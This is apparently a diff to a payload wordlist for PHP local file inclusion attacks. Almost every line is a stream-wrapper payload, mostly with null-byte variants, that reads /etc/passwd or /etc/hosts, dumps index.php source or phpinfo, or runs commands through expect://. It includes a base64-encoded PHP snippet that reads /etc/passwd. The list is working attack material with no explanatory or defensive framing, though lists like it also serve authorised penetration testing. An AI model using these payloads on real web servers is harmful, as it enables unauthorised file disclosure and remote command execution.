@@ -1,28 +1,70 @@
-php://fd/3
-php://fd/3%00
+compress.zlib:///etc/hosts
+compress.zlib:///etc/hosts%00
+compress.zlib:///etc/passwd
+compress.zlib:///etc/passwd%00
+data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>%00
+data://text/plain,<?php echo base64_encode(phpinfo()); ?>
+data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00
 data://text/plain,<?php phpinfo(); ?>
 data://text/plain,<?php phpinfo(); ?>%00
-php://filter/zlib.inflate/resource=test.deflated
-php://filter/zlib.inflate/resource=test.deflated%00
-php://filter/convert.base64-encode/resource=/etc/passwd
-data://text/plain,<?php echo base64_encode(phpinfo()); ?>
-php://filter/convert.base64-encode/resource=/etc/passwd%00
-data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00
-php://filter/string.strip_tags/resource=data://text/plain,<h1>HACKER</h1>
-php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd
-php://filter/string.strip_tags/resource=data://text/plain,<h1>HACKER</h1>%00
-data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
-php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd%00
-php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=
-data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>%00
+data://text/plain;base64,PD9waHAgZWNobyBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsgPz4=
+data://text/plain;base64,PD9waHAgZWNobyBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsgPz4=%00
+expect://id
+expect://id%00
+expect://ls
+expect://ls%00
+file:///etc/passwd
+file:///etc/passwd%00
+glob:///etc/*
+glob:///etc/*%00
+glob:///etc/*.*
+glob:///etc/*.*%00
+glob:///var/www/html/*.php
+glob:///var/www/html/*.php%00
+php://fd/0
+php://fd/0%00
+php://fd/1
+php://fd/1%00
+php://fd/10
+php://fd/10%00
+php://fd/2
+php://fd/2%00
+php://fd/3
+php://fd/3%00
+php://fd/4
+php://fd/4%00
+php://fd/5
+php://fd/5%00
+php://fd/6
+php://fd/6%00
+php://fd/7
+php://fd/7%00
+php://fd/8
+php://fd/8%00
+php://fd/9
+php://fd/9%00
+php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgcGhwaW5mbygpOyA/Pg==
+php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgcGhwaW5mbygpOyA/Pg==%00
 php://filter/convert.base64-decode/resource=data://plain/text,SEFDS0VSIEhBQ0tFUg==
-php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd
-php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=%00
-php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=
-php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
 php://filter/convert.base64-decode/resource=data://plain/text,SEFDS0VSIEhBQ0tFUg==%00
-php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd%00
-php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=%00
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd%00
+php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
 php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd%00
+php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=
+php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=%00
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=%00
 php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd
 php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd%00
+php://filter/string.strip_tags/resource=data://text/plain,<h1>HACKER</h1>
+php://filter/string.strip_tags/resource=data://text/plain,<h1>HACKER</h1>%00
+php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd
+php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd%00
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd%00
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd%00
+php://filter/zlib.inflate/resource=/etc/passwd
+php://filter/zlib.inflate/resource=/etc/passwd%00
